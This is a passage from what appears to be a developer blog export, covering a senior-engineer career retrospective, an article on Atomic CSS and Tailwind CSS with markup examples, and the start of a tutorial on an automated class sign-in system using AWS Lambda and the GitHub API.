digested and produced after organizing them myself. I think the reason why these articles are so popular is that they have context. The development of technology has context. React will appear to solve some problems that jQuery and Angular cannot solve. Otherwise, we don’t need a new technology, and this new technology will not be so popular. As long as you can find that reason, you can connect these points into a line, and connect more to become a surface, becoming a complete knowledge map. In those two articles, I started from the simplest state and pushed down step by step. It’s like a mathematical proof or a logical proof. Each step is related to the previous step. It becomes more and more complicated in the proof process, but each step is interlocking. Letting a novice touch React directly is like letting him start from the tenth step of the proof. He doesn’t know how he got here and needs to spend a lot of time to figure out how to move on to the next step. But if you let him start from the first step, take him to the second step, the third step, and so on, when he reaches the tenth step, he knows why he is here. He knows that this step is actually the accumulation of the previous ten steps. This is the difference between having context and not having context. The reason why my articles are special is that I take readers from the first step and lead them step by step to the tenth step. So for people with no foundation, it is not particularly difficult; for those who already have a foundation, it will connect everything they have learned before and give them a refreshing feeling. TeachingI have actually been teaching intermittently before, but in January of this year, I finally tried what I have always wanted to do: to cultivate an engineer from scratch. I have done two sessions of the program, and the detailed plan can be found in the Program 2 Enrollment Briefing. The course outline is also available on GitHub for those who want to learn on their own. The second session is coming to an end, but it will take until early February to evaluate the results. I learned the most during the teaching process. Before each class, I had to make sure I fully understood the topic I was going to teach. This gave me the opportunity to understand some concepts that I had rarely encountered before, such as database views, stored procedures, triggers, and ACID. The course outline was designed according to the context I mentioned earlier, but the difficulty gap was a bit too large, so there are still many areas that need to be adjusted. However, overall, I think there is no problem with what was taught. Everything that needed to be learned was learned, and not only the tools but also the principles. Teaching is one of the few things I can maintain momentum and stick to. Although it is part-time teaching, I believe that the quality of the course is not too far from that of full-time teaching. As a one-person team, I think I did a good job. But of course, I won’t stop here. I think there is always room for improvement in the course. CommunicationWhen I first took on the position of Front-end Team Lead a year ago, I was actually very nervous. At that time, my supervisor just asked me if I was interested in trying it out slowly, and I said I could try it out slowly. The next week, I was pulled into this position. I originally thought I would be apprenticing with my supervisor first, but that didn’t happen at all. However, although it is called Team Lead, it is actually more like Lead Engineer. The difference is that the former tends to be a management position that leads people, while the latter focuses on the technical side. I think in terms of job content, the latter is closer. What I have to do is communicate with the PM and hold a sprint planning meeting every two weeks to see what tickets to put in. When there are new features, I have to give the PM a rough time estimate and distribute the tickets to other colleagues to decide what they need to do. Simply put, I am responsible for communicating with the PM, and other front-end engineers are responsible for solving those tickets. But I also have to write code myself, and some of my time is reserved for communicating with the PM. Whenever there is any problem with the front-end, they come to me. I think I spend about 80% of my time writing code and the other 20% dealing with project-related matters. In short, I have to keep communicating. I actually knew that my communication skills were not bad before, but I was nervous this time because I had to communicate in English… When I first joined the company, my English was quite poor (it’s not much better now), and I was afraid that I would keep jumping and saying, “Sorry, can you repeat again?” At first, I did have some communication problems, but after two or three months in this position, I found that I was starting to get used to it. I was super focused during meetings, and although there were still some words I didn’t understand, I just focused on the keywords, and understanding 70-80% of what was said was enough for smooth communication. In addition to this, I have also started to act as an interviewer in recent months. I have always felt that interviews are something that companies need to pay a lot of attention to because they are the company’s external face. A bad interview is worse than a bad meal. I am still exploring how I can do better in interviews, but I remember what my senior said: the purpose of an interview is not to show off, but to see the strengths of the interviewee, whether they are suitable for the position, and whether they want to work with them. If the purpose of the interview is just to show off, then it is completely meaningless. By the way, some people’s resumes are really poorly written. They have ten years of work experience, but it’s hard to tell what they have done. So, am I a senior engineer?Okay, after reviewing so much, I finally returned to the title. Two years ago, I mentioned this great article: How to qualify as a senior engineer, which provides some indicators for reference and thoughtfully provides counter-indicators so that everyone knows what it looks like to go crazy. After two years of training, I independently completed the development of a live streaming website in my previous company, and during this period, I deepened my understanding of the basics. My understanding of developing new features has changed from “not knowing if I can do it” to “I can do it, but it may take some time,” which has greatly increased my confidence. In my current company, I finally have more opportunities for discussion and communication. I discuss with two other front-end engineers which library to choose, how to set coding style, how to name files, etc. I also communicate more frequently with the PM, which has further deepened my understanding of communication and project management. In the past year, I have been responsible for four front-end projects in the company, and I have a different understanding of the architecture or technology used in each project. When doing different projects, I can observe the architecture and code written by others and cultivate the habit of fixing bad code on the spot. Before refactoring, someone said a great sentence: “Many engineers only rebuild, not refactor.” Refactoring should be gradual. If you want to wait until you have time to start over, you will never have time. What you should do is fix some things while fixing bugs or writing new features. For example, if I change something in the purchase process today, I will refactor that part. You don’t have to do it perfectly, just make sure the code quality is better than before, and it will get better and better. Writing blog posts and sharing experiences outside of work has been a great way for me to spend my time. Occasionally, I would spend six or seven hours just to write a technical article. Most of my time, however, was spent on teaching and training. The success of my students has proven the value of my curriculum, and teaching has also helped me solidify my own foundation. Two years ago, with only a year and a half of work experience, I joined my second company. I considered myself a decent programmer, but my foundation was weak and my experience was lacking. I didn’t feel like I deserved the title of “senior engineer,” so I called myself a “junior engineer.” Now, two years later, I can put various front-end tools into context, explain why they exist, and describe their benefits. I can also explain how to use them in projects. I have a good foundation in the essential skills of a front-end engineer, and I can discuss various strange phenomena in JavaScript, as well as network and browser issues. When a PM presents a requirement, I’m not worried about whether I can do it or not because I know I can. Instead, my focus is on how to implement it beautifully and in the required time. I also understand that engineers have many important tasks besides writing code, such as understanding requirements, communicating, and thinking. Yes, I think I am a senior engineer now. If you agree, please like and share (just kidding). What’s next?The more you know, the more you realize your shortcomings. There are still many areas where I need to improve, even as a senior engineer. Even if you’re a senior engineer, there can be a 30-point difference between a 90 and a 60. Learning is endless, and there is still much to learn. Here are a few areas I want to focus on: First, I have a good foundation in JavaScript, but I want to be more stable. I hope to be so stable that I am not surprised by any JavaScript-related articles. Second, I am weak in testing. I only have experience with unit tests, and I don’t know what to test when it comes to testing components in React. I also have little experience with end-to-end testing. I believe that testing is a critical key to moving to the next level. It can change the way you look at code and improve quality. Third, I want to deepen my understanding of the tools I use. I hope to spend some time studying the source code of Vue, React, and Redux to learn more about their architecture and design. Fourth, I have a limited understanding of some “basics,” such as browsers and networks. I have a general understanding of the rendering process in browsers, but I don’t understand each step well enough. I also hope to become more familiar with HTTP, HTTP2, and TCP&#x2F;IP. Fifth, I lack a foundation in computer science, such as operating systems, computer organization, algorithms, and data structures. If I want to move up, these are also essential parts. The most effective way to learn is probably to take courses offered by universities. Technology is the foundation of an engineer, and we must not forget this. We must not let our technical skills become obsolete. It is because of our technical abilities that we can reach our current position. ConclusionI am very fortunate to have written that article two years ago. It was a great summary for me, and it allowed me to compare myself to my past self. After rereading my retrospective from two years ago, I realized that my concepts are still similar, and I still value sharing. Therefore, I have not stopped sharing in the past two years. I still believe that “pain is the best teacher,” and I have turned these concepts into articles. Otherwise, I would have to explain them again every time I mention them, which is not in line with the character of an engineer. I support breadth before depth because it has been helpful for me. As for the problem of small companies versus large companies, I have not yet worked for a large company, so I cannot share my experience. It may take some time before I can share my experience with everyone. Every time I write a retrospective like this, I am amazed at how quickly time passes. I didn’t even realize that two years had passed. However, this also makes me look forward to what I will become next time. That’s it. See you in two years!","link":"/2018/12/29/en/after-two-years-am-i-senior/"},{"title":"An Introduction to the Tailwind CSS and Atomic CSS","text":"Recently, there has been a series of discussions about Tailwind CSS on the Front-End Developers Taiwan Facebook group. The reason for this is another post that has been deleted. I have seen that post, but I won’t talk about what it was about because it’s not the focus of this article. Anyway, that post sparked a lively discussion among front-end communities on Facebook, and many articles related to technology were quickly added within two or three days. And many people are actually discussing the concept of Atomic CSS more than the tool Tailwind CSS. The term Atomic CSS was coined by Thierry Koblentz and first appeared in this must-read classic published in 2013: Challenging CSS Best Practices. So what is Atomic CSS? Here’s the definition given by Let’s Define Exactly What Atomic CSS is: Atomic CSS is the approach to CSS architecture that favors small, single-purpose classes with names based on visual function. For example, something like this is Atomic CSS: .bg-blue &#123;background-color: #357edd; &#125; .margin-0 &#123; margin: 0; &#125; And Tailwind CSS is a CSS framework that implements the concept of Atomic CSS. In 2019, I also wrote an article about Atomic CSS, but I used another synonym called Functional CSS: Functional CSS Experience Sharing: A Blessing or a Curse?. I have already mentioned some of the things I want to talk about in that article, but I think it’s not complete enough, so I wrote another one. In this article, I hope to read these classic articles with you because you will find that some of the points of contention may have been raised, discussed, or even resolved eight or nine years ago. Then we can see what the difference is between the earliest Atomic CSS and the current Tailwind CSS, and what are the advantages and disadvantages? The outline is as follows: The Birth Background of Atomic CSS What problem does Atomic CSS want to solve? Problems and Refutations of Atomic CSS My View on Atomic CSS What has Tailwind CSS Improved? Conclusion The Birth Background of Atomic CSSAs mentioned at the beginning, the term Atomic CSS was coined by Thierry Koblentz, a Yahoo! engineer, in Challenging CSS Best Practices in 2013. Before reading this article, we can take a look at this interview in February 2022: The Making of Atomic CSS: An Interview With Thierry Koblentz, which mentions more about the background of Atomic CSS and its early application within Yahoo!. According to the article, one day his supervisor asked him if there was a way to change the front-end style without changing the stylesheet because he wanted to avoid breaking things. So TK made a “utility-sheet” that allowed engineers to change the front-end style without changing the stylesheet. It sounds like this utility-sheet is a static CSS file with various utility classes. Years later, a project manager asked if they could “use utility classes for everything” to rewrite Yahoo!’s homepage, which was pioneering at the time. Finally, they wrote a pure static CSS called Stencil to accomplish this (this will be contrasted with something that will appear later), and discovered many benefits of using it this way. One of the features of this pure static CSS is that it can force compliance with some design styles, such as only writing classes like margin-left-1, margin-left-2, margin-left-3, etc., and each corresponding to x4, so your margin can only be 4px, 8px, and 12px, which are multiples of 4, using this to force design to follow existing rules. However, they later found that this system did not work. In the real world, each design team has its own different requirements, and they all want different padding, margin, font, and color, so static is not possible, customization is needed, and dynamic generation is needed. Thus, Atomizer was born, a tool that generates corresponding CSS files for you. For example, if you have a page that says: &lt;div class=\"D(b) Va(t) Fz(20px)\">Hello World!&lt;/div> Atomizer will automatically generate the following CSS for you: .D(b) &#123; display: block; &#125; .Va(t) &#123; vertical-align: top; &#125; .Fz(20px) &#123; font-size: 20px; &#125; This way, engineers can have greater flexibility to meet design requirements. The syntax seen above is called ACSS, which is basically similar in functionality to the current Tailwind CSS, but uses different syntax. The naming convention of this ACSS system is inspired by Emmet, a package that allows you to quickly build HTML using syntax, and the () in the class name is inspired by function calls. TK then talked about the differences between writing CSS in a large enterprise like Yahoo! and elsewhere. You face extremely complex situations, including cross-national and cross-timezone communication, distributed team members, hundreds of shared components, l10n and i18n, a lot of legacy code, and a lot of office politics. In the case of maintaining a super complex project, he began to reflect on whether some common practices really bring benefits, and found that some concepts are not only not beneficial, but even harmful. In a complex project, there are many situations that you may not have thought of, so maintenance becomes very difficult, and you must be careful to avoid some pitfalls. In addition, the journey of promoting ACSS internally did not start smoothly. It seems that many teams were hesitant about such syntax (I guess, as I wrote in a previous article, at first glance, it looks like some kind of evil way), but the benefits of ACSS are reflected in the data. Projects that adopt ACSS have reduced the size of CSS and HTML by about 36%, so many projects still use ACSS. If you copy the HTML of page A and paste it into page B, you will find that the UI has not changed at all. After using ACSS, there will be no different styles on other pages, which is the benefit of ACSS. The original text is written as follows: This is because ACSS makes these components page agnostic. “Page agnostic” is an important property that I will mention later. The original interview also mentioned more background stories and challenges, but I will not continue to mention them here. Arvin, a good partner of TechBridge, used to work at Yahoo! and wrote ACSS internally. In 2017, he wrote an article that is also worth reading: Shallow Talk on CSS Methodology and Atomic CSS. In fact, this interview did not focus on the problems that Atomic CSS wants to solve, but from it, we can see that TK needs to maintain large projects at work, so he naturally encounters many pain points. It is not difficult to imagine that the background of the birth of Atomic CSS is also related to this. To find out what problems Atomic CSS wants to solve, let’s take a look at the classic work. At the beginning of the article’s quick summary, there is a paragraph that says: When it comes to CSS, I believe that the sacred principle of “separation of concerns” (SoC) has lead us to accept bloat, obsolescence, redundancy, poor caching and more. Now, I’m convinced that the only way to improve how we author style sheets is by moving away from this principle. Everyone knows that when writing web pages, we should pay attention to separation of concerns, allowing HTML to focus on its content and CSS to focus on style, linking the two through class names. However, the author found that this concept actually brings many negative effects. Therefore, this article is to persuade everyone not to regard this practice as a creed. If there is a better way, why stick to it? Then the article gives a simple example called a media object. The HTML looks like this: &lt;div class=\"media\"> &lt;a href=\"https://twitter.com/thierrykoblentz\" class=\"img\"> &lt;img src=\"thierry.jpg\" alt=\"me\" width=\"40\" /> &lt;/a> &lt;div class=\"bd\"> @thierrykoblentz 14 minutes ago &lt;/div> &lt;/div> The CSS looks like this: media &#123; margin: 10px; &#125; .media, .bd &#123; overflow: hidden; _overflow: visible; zoom: 1; &#125; .media .img &#123; float: left; margin-right: 10px; &#125; .media .img img &#123; display: block; &#125; The final result is shown below: Then the first requirement comes up. In some places, the image needs to be displayed on the right instead of the left. So we can add a new class imgExt to the HTML element and add the following CSS: .media .imgExt &#123; float: right; margin-left: 10px; &#125; Then the second requirement comes up. When this block of content appears in a right rail, the text needs to be smaller. So we can wrap a div around it like this: &lt;div id=\"rightRail\"> &lt;div class=\"media\"> &lt;a href=\"https://twitter.com/thierrykoblentz\" class=\"img\"> &lt;img src=\"thierry.jpg\" alt=\"me\" width=\"40\" /> &lt;/a> &lt;div class=\"bd\"> @thierrykoblentz 14 minutes ago &lt;/div> &lt;/div> &lt;/div> Then adjust the style for #rightRail. The adjusted style is as follows: media &#123; margin: 10px; &#125; .media, .bd &#123; overflow: hidden; _overflow: visible; zoom: 1; &#125; .media .img &#123; float: left; margin-right: 10px; &#125; .media .img img &#123; display: block; &#125; .media .imgExt &#123; float: right; margin-left: 10px; &#125; #rightRail .bd &#123; font-size: smaller; &#125; These methods of adjusting styles should be quite intuitive, but the author points out that there are actually several problems: Every time the UI needs to support a different style, a new CSS rule must be added. .media and .bg share the same style. If there are other things to share, the CSS selector will become larger and larger. Four of the six CSS selectors are context-based, which is difficult to maintain and reuse. RTL (Right To Left) and LTR (Left To Right) will become very complicated. At first glance, the first point seems normal. If you want to support different styles in different situations, don’t you have to write new CSS rules? But the author says there is a better way to handle it without adding new rules. The second point seems normal too. Isn’t it common to write .media, .bg to share styles? Isn’t it inevitable if the file is large? For the third point, context is a very important concept. For example, our media object will have different styles based on context (whether it is under #rightRail), so different CSS rules are written to handle it. Once your CSS rules are related to context, maintenance becomes difficult in large projects. For example, if someone accidentally changes the rightRail id to blockRightRail, your style will break. You may question, “Isn’t this his fault? If he wants to change it, he should make sure that other places won’t break.” Anyone who has made changes knows how difficult it is to make sure that other places won’t break, especially in large projects. It is very likely that when you change A, you don’t expect B to break because you don’t know they are related. Or if another team wants to use your media object, they will copy and paste the CSS along with it to their project, but they find that their id is not rightRails, so they have to modify the style. The fourth point is something that only large companies like Yahoo! can do (at least I haven’t done it). When doing l10n, there are many details to consider, such as some countries’ reading direction is left-to-right, and some are right-to-left. If you want to change the direction of the above case, you need to add these two rules: .rtl .media .img &#123; margin-right: auto; /* reset */ float: right; margin-left: 10px; &#125; .rtl .media .imgExt &#123; margin-left: auto; /* reset */ float: left; margin-right: 10px; &#125; Then the author introduces the concept of Atomic CSS and uses it to rewrite the example. The benefits of this approach and the HTML and CSS are shown below: &lt;div class=\"Bfc M-10\"> &lt;a href=\"https://twitter.com/thierrykoblentz\" class=\"Fl-start Mend-10\"> &lt;img src=\"thierry.jpg\" alt=\"me\" width=\"40\" /> &lt;/a> &lt;div class=\"Bfc Fz-s\"> @thierrykoblentz 14 minutes ago &lt;/div> &lt;/div> .Bfc &#123; overflow: hidden; zoom: 1; &#125; .M-10 &#123; margin: 10px; &#125; .Fl-start &#123; float: left; &#125; .Mend-10 &#123; margin-right: 10px; &#125; .Fz-s &#123; font-size: smaller; &#125; Regarding the first point, do you remember the new requirement we had at the beginning? Now we don’t need to add a new CSS rule, we just need to add class=&quot;Fl-sart Mend-10&quot; to the HTML to change the UI style, but without adding any new rules. For the second point, now all elements that need overflow:hidden and zoom:1 can be handled with just one class name called .Bfc, no matter how many elements need it, I only have one CSS selector. For the third point, the class name is now unrelated to the context, so the problem I mentioned earlier will not occur. Today, if I want to change the style, I can safely delete the class name because I know that nothing else will break. This is what the first paragraph of the article refers to as “page agnostic”. Class names that are unrelated to the context can be easily modified and moved around while still ensuring the same style. In other words, it solves the problem of scope, as stated in the original text: I believe that this approach is a game-changer because it narrows the scope dramatically. We are styling not in the global scope (the style sheet), but at the module and block level. We can change the style of a module without worrying about breaking something else on the page. Finally, regarding the direction issue mentioned in the fourth point, it has already been abstracted through the class name. If you want to change the direction, you just need to change the CSS to this: .Fl-start &#123; float: right; &#125; .Mend-10 &#123; margin-left: 10px; &#125; By rewriting it as Atomic CSS, we have successfully solved several problems that traditional CSS writing methods encounter, and it has the following advantages: The size of the CSS file grows linearly, and repeated rules use the same class name, so the file size is greatly reduced. It can easily support RTL and LTR. The class name becomes unrelated to the context, and the scope becomes smaller, making it easier to maintain and modify. I believe that the most important of these is the third point, which is also why I support Atomic CSS. When changing styles, you can simply delete the class name without worrying about affecting other elements. This is such a beautiful thing, and you no longer have to worry about breaking something else when changing A because the class name is unrelated to the context. The author of Tailwind CSS has written an article before, which has more emphasis and examples on how Atomic CSS solves the problems of traditional CSS. If the above reasons are not convincing enough, you can read this article: CSS Utility Classes and “Separation of Concerns”. In short, TK also anticipated that although this approach can solve problems, readers will definitely have a lot of doubts, so he is ready to refute them one by one. Issues and Refutations Regarding Atomic CSSIn addition to the article, I may also refer to these three sources for the following issues and refutations: ACSS FAQ HTML5DevConf: Renato Iwashima, “Atomic Cascading Style Sheets” Thierry Koblentz’s presentation at FED London 2015 1. Your class name has no semantics, this is not allowed, the specification is not written like thisRegarding the semantic issue, this was also discussed in an article in 2012: About HTML semantics and front-end architecture, and there is indeed a paragraph in the HTML spec that states: There are no additional restrictions on the tokens authors can use in the class attribute, but authors are encouraged to use values that describe the nature of the content, rather than values that describe the desired presentation of the content. If the element is an image, then the class name should be image, not something like display-block width-[150px] margin-3 that describes its style. The article mentioned above also pointed out that such naming strategies can become a hindrance when maintaining large projects. We don’t have to follow this, because: The semantics related to content can be seen in HTML. Except for a standard called Microformats, class names have little meaning for machines and ordinary visitors. We use class names only because we want to combine them with JS or CSS. If a website doesn’t need style or JS, it won’t take class names, right? Does this make your website less semantic? For developers, class names should contain more useful information. Then he gave an example: &lt;div class=\"news\"> &lt;h2>News&lt;/h2> [news content] &lt;/div> You can tell from the content that this block is for presenting news, and there is no need for a class name. This reminds me of the development of JSX, which also directly broke the best practice that JavaScript and HTML should be separated. If everyone is obsessed with the rules set by their predecessors, and follows them like a creed without reflecting on the reasons for their existence, there will be no so many innovative things. As mentioned in the article Challenging CSS Best Practices: Tools, not rules. We all need to be open to new learnings, new approaches, new best practices and we need to be able to share them. 2. Your class name is too difficult to understand, and the readability is poor.Take a slide from the FED London 2015 presentation. They said that the syntax of ACSS is based on Emmet, and the readability is not bad: But I don’t fully agree with this explanation, because for someone who hasn’t used Emmet before, it really doesn’t look easy to understand, and it takes some time to get familiar with those abbreviations. 3. What’s the difference between this and inline style?In essence, they are the same, both limiting the style to a very small scope, but Atomic CSS solves some of the drawbacks of inline style: CSS has a high priority and is difficult to override. It is very verbose. It does not support pseudo-classes or pseudo-elements. Here is a picture from the official website: Atomic CSS retains the advantages of inline style, that is, the scope is very small, while also solving the above-mentioned drawbacks. 4. You said it can reduce the size of CSS, but won’t the size of HTML increase? It’s just shifting the cost to somewhere else.Under the original ACSS writing method, the length of the class name is not much longer than before. For example, it used to be called profile__image-background, and after rewriting, it might be something like D-ib Bgc(#ff0010). According to their own statistics, the average length of class names on Yahoo! website is 22, while the average length of Twitter without using ACSS is 28, USA Today is 38, The Guardian website is 36, and only Facebook, which has specially uglified class names, is 18, slightly winning. Moreover, in addition to the class name not being significantly longer, ACSS also has the advantage of having many duplicate characters, so the compression rate of gzip will be higher. The official website has given a data that after their own testing, semantic classes can reduce the size by 35%, while ACSS can reduce it by 48%. 5. What about shared components like buttons? Do I have to change the style everywhere?In the article “Challenging CSS Best Practices,” there is a paragraph discussing the idea of reevaluating the benefits of the common approach rather than adopting it as the de facto technique for styling web pages. Atomic CSS does not aim to completely replace the traditional semantic approach, and the correct approach is to use whichever is suitable. The FAQ on the official website also mentions a similar idea: if changing some styling requires editing multiple files, then the classic CSS approach should be used. For example, if a button in your program repeatedly appears, copying and pasting HTML each time and changing the class name in each file is clearly unreasonable. In this situation, using the traditional approach would be better. In my opinion, Atomic CSS brings two unique benefits: reducing the size of CSS files and minimizing scope to make maintenance easier. The former is obvious, and the latter ensures that changing the class name of an element only affects that element, not other parts of the code. This is the biggest advantage of Atomic CSS, making style local scope. However, Atomic CSS has some disadvantages and is not suitable for use in certain situations. For example, class names are long and difficult to read in HTML, and if it is impossible to achieve componentization, Atomic CSS is not suitable. Additionally, it takes time to learn the syntax and abbreviations of Atomic CSS. The popularity of the three major frameworks has led to most front-end developers thinking in terms of components rather than the traditional approach of HTML managing content, JavaScript managing programs, and CSS managing styles. After componentization, the first two problems are solved, as developers look at component files instead of HTML and can understand what they do based on their names. Additionally, because everything is a component, changes only need to be made in one place. Finally, CSS-in-JS and CSS modules both solve the scope problem, but they require the use of front-end libraries or frameworks like React or Vue, while Atomic CSS does not. Additionally, CSS-in-JS and CSS modules cannot achieve the same small CSS file size as Atomic CSS. However, Facebook’s Atomic CSS-in-JS solution combines the advantages of both approaches, allowing developers to write in traditional CSS syntax while generating code in the Atomic CSS way. What parts did Tailwind CSS improve?After discussing so much about Atomic CSS, let’s take a brief look at Tailwind CSS. What are its advantages compared to Atomizer, which was created by Yahoo! at the beginning? Actually, I don’t think there is much difference in terms of functionality. The biggest advantage is that I think its DX (Developer Experience) is more prominent. For example, it uses class names that are easier to understand, and the documentation is more complete. You can quickly find out how to write a certain syntax: In fact, I think the direction of optimization for these Atomic CSS-based frameworks is similar, which is to improve the DX direction. For example, Windi CSS brings many improvements and new usage in syntax, while UnoCSS and master CSS also have their own different methods to increase the developer’s experience or speed up compilation efficiency. As for the details of these optimizations, I am not familiar with them. For more information, please refer to the article “Reimagining Atomic CSS” (https://antfu.me/posts/reimagine-atomic-css-zh). I am not very familiar with Tailwind CSS either. Here is a point to note: Tailwind CSS scans your source code string to see which ones match a specific format. Therefore, if your class name is dynamically generated, it will not be captured, like this: // wrong &lt;div class=\"text-&#123;&#123; error ? 'red' : 'green' &#125;&#125;-600\">&lt;/div> // correct &lt;div class=\"&#123;&#123; error ? 'text-red-600' : 'text-green-600' &#125;&#125;\">&lt;/div> I’m not sure if other libraries have solved this problem, but I personally don’t think it’s a big deal because it’s better to avoid this dynamic generation method if possible. Why do I say that? Let me share a story. When I was maintaining a project using Redux, there were a series of operations that were very similar, such as CRUD for post, user, and restaurant. A large part of the code was duplicated, so I wrote a utils to handle common logic. Just write generateActions(&#39;user&#39;), and it will automatically generate actions like readUser and createUser. At that time, I thought it was great, but my colleague reminded me that if you do this, you won’t be able to search for readUser globally because it is dynamically generated in the program and cannot be found in the source code. Although I didn’t think it was a big deal at the time, I knew I was wrong two months later. When you face an unfamiliar project and want to fix a bug, the most common thing to do is to search the source code with the information you have on hand to see where it appears. If you can’t find anything, it’s frustrating and you need to spend more time finding where the problem is. Therefore, being searchable is important. Or take another example. Suppose the designer suddenly changes his mind and says that all the places where text-red-600 was used before should be changed to text-red-500, but the new places will still use text-red-600, so we cannot directly change the color code in the configuration file. We must go to the source code and change all text-red-600 to text-red-500. What would you do? Search and replace globally, done. At this time, cases like the one above that generate class names dynamically will not be changed unless you specifically remember them. Because it cannot be searched, you don’t know that text-red-600 will actually appear there. If you really want to generate dynamically, at least add a comment to mark the full name of the things that will be used, so that it can be searched. Conclusion“Every tool has its place” is a well-known saying, but the key is “where does it fit? Where does it not fit? What problem does it solve? What additional problems does it create?” Based on these questions, we can discuss a technology more deeply. Atomic CSS was born under the background of maintaining large-scale projects. If you haven’t encountered the situation where “a slight change can affect the whole body, and you need to check many places to see if it will break” then you may not feel the benefits of Atomic CSS, because the problem it wants to solve is not something you have encountered. For those situations where “the problem it wants to solve, your project has not encountered”, the difference between introducing or not introducing is not big, and some may even increase unnecessary complexity. Or, for example, if you write a UI library and this library needs to support some UI customization, how do you use Atomic CSS to style it? Do you have to open every HTML element to pass in class names? In this case, using traditional CSS solutions like antd that can directly modify the original Less file may be more suitable, because you can easily customize it. (daisyUI achieves customization by opening up HTML, which is more like writing a React component that encapsulates the implementation details.) Each project has different suitable technologies and tools. When making choices, you should first understand the requirements of each project and the advantages and disadvantages of each technology, so that you can choose the relatively appropriate technology. Finally, from the history of Atomic CSS, I think the most worth learning is the “Tools, not rules” section. The best practices of the past may not apply to the current situation. The class names used in the past are not used in this way, which does not mean that it is not feasible now. We should not stick to the rules and be obsessed with those rules. If there are obvious benefits to other methods, why not? References: Challenging CSS Best Practices Let’s Define Exactly What Atomic CSS is The Making of Atomic CSS: An Interview With Thierry Koblentz Atomizer ACSS FAQ HTML5DevConf: Renato Iwashima, “Atomic Cascading Style Sheets” Thierry Koblentz’s presentation at FED London 2015 About HTML semantics and front-end architecture Atomic CSS-in-JS Shallow talk about CSS methodology and Atomic CSS Is Functional CSS a Blessing or a Curse? Objective evaluation of TailwindCSS Uno CSS - The Rising Star of Unification? Reimagine Atomic CSS Planning Tailwind CSS architecture in VUE SFC (vue-cli)","link":"/2022/05/23/en/atomic-css-and-tailwind-css/"},{"title":"AWS Lambda + GitHub API + Google Sheet = Automated Sign-in System","text":"IntroductionDuring the past year, I have conducted several teaching experiments in my spare time, hoping to improve my teaching materials through continuous teaching and gain some insights from student feedback. When conducting these teaching experiments, I often think about which existing services can reduce my workload. After all, as an engineer, I want to automate some trivial tasks, and the time saved in the long run is considerable. Half a year ago, I made my first attempt and shared my experience here: Using Github Classroom and Travis CI to Build a Homework Grading System. After having an automated homework grading system, it did save me a lot of trouble. This time, I want to share an automated sign-in system that I implemented in about one or two days two weeks ago. Why do we need a sign-in system?In order to grasp the progress of students and ensure that students are really interested in continuing to attend classes, I introduced the Daily Stand-up meeting that I do every day in the company during the last teaching experiment. Everyone quickly shares what they did yesterday, what they will do today, and if there is anything that prevents them from completing these tasks. At that time, I used a fixed format for everyone to post these things in the Slack channel: The advantage is that it is concentrated in one place and is very convenient to view, but the disadvantage is that I can only see it with my own eyes and cannot record it. That is to say, if I want to make a form of which students did not post, I can only fill it out one by one. Last time, because there were few students and posting was not mandatory, it was not a problem, but in this teaching experiment, I introduced the elimination system. If a student fails to submit a progress report too many times within a certain period, he or she will be eliminated from the course. Since I have this mechanism, I must record these progress reports, and record which people and which days have no reports. In this way, I must have a more complete sign-in system. The goals I want to achieve are: I want to see everyone’s progress report in the slack channel I want a place to record whether each student has posted a progress report every day (called sign-in) How to make this sign-in system?My first idea is to use Google Sheets, after all, this thing is the most convenient. Fill in each student’s account on the horizontal axis and the date on the vertical axis. If there is a report, give a mark, otherwise leave it blank. In this way, I can clearly see the sign-in record. The finished product looks like this: In this way, the second requirement is completed, and the remaining is to think about how to complete the first requirement. The easiest way is to let students post by themselves in a certain channel, and then I write a program to connect to Slack’s webhook, and write the data into the Google Sheet when receiving the data. This solution seems good, but there is a problem that the workspace used in the course is the free version, and the message will be eaten up after a certain amount, and the previous progress reports cannot be seen. I think this is a bit regrettable, so this solution is not feasible. Then I thought of another better solution: Let students leave a message under the GitHub Issue Synchronize the message to the Slack channel Connect to the GitHub Webhook and synchronize the record to the Google Sheet The advantage of this is that the record can be permanently saved, and it can be divided by day! It is easy to find all the progress reports of everyone on a certain day, which cannot be done by directly posting in Slack. Let me show you the finished product first. The finished product looks like this: After having a concept of the entire sign-in system, we can divide the technical tasks into the following three items: Open a GitHub issue every day with today’s date as the title. Synchronize every comment under each issue to Slack. Integrate GitHub Webhook to synchronize records to a spreadsheet. Now it’s time to implement! 1. Open a GitHub issue every day with today’s date as the title.When I saw the keyword “every day,” I knew this was something that could be done with a Cron Job. Originally, I wanted to write a simple program on my own machine to run it every day, but then a keyword popped up in my mind: AWS Lambda. If you don’t know what it is, let me explain briefly. It is one of the popular concepts of Serverless in recent years. It doesn’t mean there is no server, but it means you don’t have to manage the server yourself. All you have to do is write your application, and you don’t have to worry about anything related to the server or the machine. AWS Lambda is such a service. All you have to do is put your code up there, and you don’t have to worry about anything else. The billing is based on the execution time of the program. Maybe because it is still in the promotion period, it is free for a certain amount of time per month. If I don’t use Lambda, I have to send the files to my server and set up a Cron Job to run them. If something goes wrong with the host, I have to fix it myself. But what I want to do is just such a simple thing! Using Lambda can save me a lot of trouble and is definitely the best choice. After deciding to use Lambda, the next step is to write the code according to its requirements. Actually, the requirements are very simple. Just export the function you want to execute with exports.handler. Here is the code: var axios = require('axios') var moment = require('moment') var token = process.env.token var endpoint = 'https://api.github.com/repos/Lidemy/mentor-daily-report/issues?access_token=' + token var today = moment().format('YYYY-MM-DD') var content = [ '在下面請按照此格式提供本日進度報告：', '```', '## 昨天', '- 寫作業 hw2-1', '- 練習 JavaScript 迴圈使用', '## 今天', '- 研究什麼是 callback', '- 寫作業 hw2-1（繼續）', '```' ].join('\\n') const createIssue = async (event) => &#123; try &#123; const result = await axios.post(endpoint, &#123; title: '[進度報告] ' + today, body: content &#125;, &#123; headers: &#123; 'Accept': 'application/vnd.github.v3+json' &#125; &#125;) return 'success' &#125; catch (err) &#123; return err; &#125; &#125; exports.handler = createIssue It is a very simple program that will use the GitHub API to create a new issue with today’s date as the title. One thing to note is that other npm libraries are used here. There should be a way to only send the package.json, and Lambda will help you execute npm install to get those packages. But I’m too lazy to check, so I just packed node_modules into the compressed file and uploaded it. The last time I used Lambda was about two or three years ago when this service was just launched. I played with it out of curiosity and found that the interface was very simple and I didn’t know how to set many things. After many years, when I saw its interface again this time, I was really shocked. It has made great progress! First of all, the trigger condition is clear at a glance: Because I want to run it every day at a fixed time, you can use CloudWatch to set a schedule on AWS. Note that the time of this schedule on Lambda will be based on UTC, which is the +0 time zone. So if you say it runs at 00:00 every day, it actually means it runs at 08:00 in the morning in Taiwan. The expression I set here is: 5 0 ? * MON-FRI *, and Lambda will be triggered at 08:05 on weekdays in Taiwan time to execute the function of creating an issue. Then, if your code is not very large, you can edit it directly on the Lambda 